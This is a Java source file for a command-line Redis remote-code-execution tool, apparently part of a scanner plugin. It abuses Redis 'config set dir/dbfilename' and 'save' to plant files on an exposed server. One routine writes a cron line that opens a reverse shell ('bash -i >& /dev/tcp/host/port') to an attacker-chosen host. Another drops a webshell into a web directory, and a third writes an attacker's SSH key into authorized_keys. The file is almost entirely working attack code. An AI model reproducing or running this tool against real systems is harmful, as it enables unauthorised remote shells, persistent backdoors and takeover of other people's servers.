package com.gbw.scanner.plugins.scripts.redis;

import com.xmap.api.utils.TextUtils;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.GnuParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.elasticsearch.common.Strings;
import redis.clients.jedis.Jedis;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.EmptyStackException;

public class GBWRedisRCE {

    public static  String cmdInfo(Jedis jedis){
        return jedis.info();
    }

    public static String  cmdKeys(Jedis jedis,int db){

        StringBuffer sb = new StringBuffer();
        sb.append(String.format("Try list all redis db:%d keys---------------\n",db));
        try {
            jedis.select(db);
            for(String s:jedis.keys("*")){
                sb.append(s);
                sb.append("\n");
            }
            sb.append(String.format("Try list all redis db:%d keys---------------ok!\n",db));
        }catch (Exception e){

            sb.append(String.format("Try list all redis db:%d keys---------------Failed!\n",db));;
        }

        return sb.toString();
    }

    public static String cmdSet(Jedis jedis,String args,int db){

        String[] kk = args.split(":");
        StringBuffer sb = new StringBuffer();
        jedis.select(db);
        return String.format("set %s:%s %s\n",kk[0],kk[1],jedis.set(kk[0],kk[1]));
    }

    public static String cmdGet(Jedis jedis,String key,int db){

        jedis.select(db);
        return jedis.get(key);
    }

    public static String cmdConfigSet(Jedis jedis,String args){

        String[] kk = args.split(":");
        String res = jedis.configSet(kk[0],kk[1]);
        return String.format("config set %s:%s %s\n",kk[0],kk[1],res);
    }

    public static String cmdConfigGet(Jedis jedis,String key){

        StringBuffer sb = new StringBuffer();

        for(String s:jedis.configGet(key)) {
            sb.append(s);
            sb.append("\n");
        }

        return sb.toString();
    }

    public static String cmdSave(Jedis jedis){

        return String.format("save is %s\n",jedis.save());
    }

    public static String cmdSlaveof(Jedis jedis,String args){

        String[] kk = args.split(":");

        String host = kk[0];
        int port = Integer.parseInt(kk[1]);

        return String.format("make slave to master--->%s:%d is %s\n",host,port,jedis.slaveof(host,port));
    }

    public static String cmdSlaveno(Jedis jedis){

        return String.format("cannel slave is %s\n",jedis.slaveofNoOne());
    }

    private static void prepare(Jedis jedis){

        try {
            jedis.configSet("stop-writes-on-bgsave-error","no");
            jedis.slaveofNoOne();
        }catch (Exception e){
            
        }
    }

    private static void printCmd(String cmd,String res,StringBuffer sb){

        sb.append(String.format("cmd:%s,result:%s\n",cmd,res));

    }

    public static String runShellAttack(Jedis jedis,String args){

        StringBuffer sb = new StringBuffer();

        String[] kk = args.split(":");

        String host = kk[0];
        int port = Integer.parseInt(kk[1]);

        String shell = String.format("\n* * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n",host,port);
        prepare(jedis);
        sb.append(String.format("Try to getshell,rhost:%s,rport:%d---------------\n",host,port));
        /*try to write /var/spool/cron*/
        try {
            sb.append("Try to write shell to /var/spool/cron/root...............\n");
            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"),sb);
            printCmd("set x "+shell,jedis.set("x",shell),sb);
            printCmd("config set dbfilename root",jedis.configSet("dbfilename","root"),sb);
            String res = jedis.save();
            printCmd("save",res,sb);
            sb.append("Try to write shell to /var/spool/cron/root...............ok!\n");
            return sb.toString();
        }catch (Exception e){
            sb.append("Try to write shell to /var/spool/cron/root...............Failed!\n");
        }

        /*try to write redis*/
        try {
            sb.append("Try to write shell to /var/spool/cron/redis...............\n");
            printCmd("config set dir /var/spool/cron",jedis.configSet("dir","/var/spool/cron"),sb);
            printCmd("set x "+shell,jedis.set("x",shell),sb);
            printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"),sb);
            String res = jedis.save();
            printCmd("save",res,sb);
            sb.append("Try to write shell to /var/spool/cron/redis...............ok!\n");
            return sb.toString();
        }catch (Exception e){
            sb.append("Try to write shell to /var/spool/cron/redis...............Failed!\n");
        }

        /*try to write to /etc/cron.d/redis*/
        try {
            sb.append("Try to write shell to /etc/cron.d/redis...............\n");
            printCmd("config set dir /etc/cron.d",jedis.configSet("dir","/etc/cron.d"),sb);
            printCmd("set x "+shell,jedis.set("x",shell),sb);
            printCmd("config set dbfilename redis",jedis.configSet("dbfilename","redis"),sb);
            printCmd("save",jedis.save(),sb);
            sb.append("Try to write shell to /etc/cron.d/redis...............ok!\n");
            return sb.toString();
        }catch (Exception e){
            sb.append("Try to write shell to /etc/cron.d/redis...............Failed!\n");
        }
        return sb.toString();
    }

    public static String runWebshellAttack(Jedis jedis,String args) throws Exception {

        String[] kk = args.split(":");

        String dir = kk[0];
        String fpath = kk[1];

        Path path = Paths.get(fpath);
        String fname = path.getFileName().toString();

        String content = new String(Files.readAllBytes(path));

        return runWebshellAttack(jedis,content,dir,fname);
    }

    public static String runWebshellAttack(Jedis jedis,String content,String shellDir,String shellFilename){

        StringBuffer sb = new StringBuffer();
        sb.append(String.format("Try to write webshell to dir:%s,file name:%s------------------------\n",shellDir,shellFilename));

        try {

            prepare(jedis);
            printCmd("config set dir "+shellDir,jedis.configSet("dir",shellDir),sb);
            printCmd("set x "+content,jedis.set("x",content),sb);
            printCmd("config set dbfilename "+shellFilename,jedis.configSet("dbfilename",shellFilename),sb);
            printCmd("save",jedis.save(),sb);
            sb.append(String.format("Try to write webshell to dir:%s,file name:%s------------------------ok!\n",shellDir,shellFilename));
        }catch (Exception e){

            sb.append(String.format("Try to write webshell to dir:%s,file name:%s------------------------Failed!\n",shellDir,shellFilename));
        }

        return sb.toString();
    }

    public static String runSSHAttack(Jedis jedis,String args) throws IOException {


        String[] kk = args.split(":");

        String user = kk[0];
        String key = kk[1];

        String content = new String(Files.readAllBytes(Paths.get(key)));

        return runSSHAttack(jedis,user,content);
    }

    public static String runSSHAttack(Jedis jedis,String user,String content) throws IOException
    {
        String auth = "authorized_keys";
        String authPath = String.format("%s/.ssh/",user);
        StringBuffer sb = new StringBuffer();
        sb.append(String.format("Try to write public key to redis server:%s------------\n",authPath));
        try {
            prepare(jedis);
            printCmd("config set dir "+authPath,jedis.configSet("dir",authPath),sb);
            printCmd("set x "+content,jedis.set("x",content),sb);
            printCmd("config set dbfilename "+auth,jedis.configSet("dbfilename",auth),sb);
            printCmd("save",jedis.save(),sb);

            sb.append(String.format("Try to write public key to redis server:%s------------ok!\n",authPath));
        }catch (Exception e){

            sb.append(String.format("Try to write public key to redis server:%s------------Failed!\n",authPath));
        }

        return sb.toString();
    }


    public static String runCmd(Jedis jedis,int db,String cmd,String cmdSplitChar) throws IOException {

        String[] cmds = cmd.split(cmdSplitChar);
        int len = cmds.length;
        String cmdName = cmds[0].toLowerCase();

        if(cmdName.equals("shell")){
            if(len!=3){
                return String.format("usage: shell%srhost%s%rport",cmdSplitChar,cmdSplitChar);
            }

            return runShellAttack(jedis,String.format("%s:%s",cmds[1],cmds[2]));
        }else if(cmdName.equals("info")){
            return cmdInfo(jedis);

        }else if(cmdName.equals("keys")){

            return cmdKeys(jedis,db);

        }else if(cmdName.equals("save")){
            return cmdSave(jedis);

        }else if(cmdName.equals("slaveno")){
           return cmdSlaveno(jedis);

        }else if(cmdName.equals("set")){
            if(len!=3){
                return String.format("usage: set%skey%s%value",cmdSplitChar,cmdSplitChar);
            }
            return cmdSet(jedis,String.format("%s:%s",cmds[1],cmds[2]),db);

        }else if(cmdName.equals("get")){

            if(len!=2){
                return String.format("usage: get%skey",cmdSplitChar);
            }

            return cmdGet(jedis,cmds[1],db);

        }else if(cmdName.equals("slaveof")){
            if(len!=3){
                return String.format("usage: slaveof%smasterhost%s%port",cmdSplitChar,cmdSplitChar);
            }
            return cmdSlaveof(jedis,String.format("%s:%s",cmds[1],cmds[2]));

        }else if(cmdName.equals("configSet")){
            if(len!=3){
                return String.format("usage: configSet%key%s%value",cmdSplitChar,cmdSplitChar);
            }
            return cmdConfigSet(jedis,String.format("%s:%s",cmds[1],cmds[2]));

        }else if(cmdName.equals("configGet")){

            if(len!=2){
                return String.format("usage: configGet%skey",cmdSplitChar);
            }

            return cmdConfigGet(jedis,cmds[1]);
        }

        return "Unimpletement cmd:"+cmdName;
    }

    public static void main(String[] args) throws Exception {

        Jedis jedis;
        String host= "127.0.0.1";
        int port = 6379;
        int timeout = 10000;
        int db = 0;

        Options opts = new Options();
        opts.addOption("host",true,"redis host");
        opts.addOption("port",true,"redis port");
        opts.addOption("db",true,"redis database index");

        opts.addOption("info",false,"redis info cmd");
        opts.addOption("keys",false,"redis keys cmd");
        opts.addOption("save",false,"redis save cmd");
        opts.addOption("slaveno",false,"redis slave no one cmd");

        opts.addOption("set",true,"redis set cmd:<key>:<value>");
        opts.addOption("get",true,"redis get cmd:<key>");
        opts.addOption("slaveof",true,"redis slave of cmd:<host>:<port>");
        opts.addOption("configSet",true,"configSet cmd:<key>:<value>");
        opts.addOption("configGet",true,"configGet cmd:<key>");

        opts.addOption("shell",true,"get-shell remote host and port: <host>:<port>");
        opts.addOption("webshell",true,"write webshell attack: <web_dir>:<webshell file path>");
        opts.addOption("ssh",true,"write public key and remote login:<user>:<key_path>");

        opts.addOption("timeout",true,"connect/read timeout");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWRedisRCE", opts);
            System.exit(0);
        }

        if(cliParser.hasOption("host"))
            host = cliParser.getOptionValue("host");

        if(cliParser.hasOption("port"))
            port = Integer.parseInt(cliParser.getOptionValue("port"));

        if(cliParser.hasOption("timeout"))
            timeout = Integer.parseInt(cliParser.getOptionValue("timeout"));

        jedis = new Jedis(host,port,timeout);
        if(cliParser.hasOption("db"))
            db = Integer.parseInt(cliParser.getOptionValue("db"));

        if(cliParser.hasOption("info")){

            System.out.println(cmdInfo(jedis));
        }

        if(cliParser.hasOption("keys"))
        {
            System.out.println(cmdKeys(jedis,db));
        }

        if(cliParser.hasOption("save")){
            System.out.println(cmdSave(jedis));
        }

        if(cliParser.hasOption("slaveno")){

            System.out.println(cmdSlaveno(jedis));
        }

        if(cliParser.hasOption("set")){

            System.out.println(cmdSet(jedis,cliParser.getOptionValue("set"),db));
        }

        if(cliParser.hasOption("get")){

            System.out.println(cmdGet(jedis,cliParser.getOptionValue("get"),db));
        }

        if(cliParser.hasOption("slaveof")){

            System.out.println(cmdSlaveof(jedis,cliParser.getOptionValue("slaveof")));
        }

        if(cliParser.hasOption("configSet"))
            System.out.println(cmdConfigSet(jedis,cliParser.getOptionValue("configSet")));

        if(cliParser.hasOption("configGet"))
            System.out.println(cmdConfigGet(jedis,cliParser.getOptionValue("configGet")));

        if(cliParser.hasOption("shell")){

            System.out.println(runShellAttack(jedis,cliParser.getOptionValue("shell")));
        }

        if(cliParser.hasOption("webshell")){

            System.out.println(runWebshellAttack(jedis,cliParser.getOptionValue("webshell")));
        }

        if(cliParser.hasOption("ssh")){

            System.out.println(runSSHAttack(jedis,cliParser.getOptionValue("ssh")));
        }

        jedis.close();

    }

}
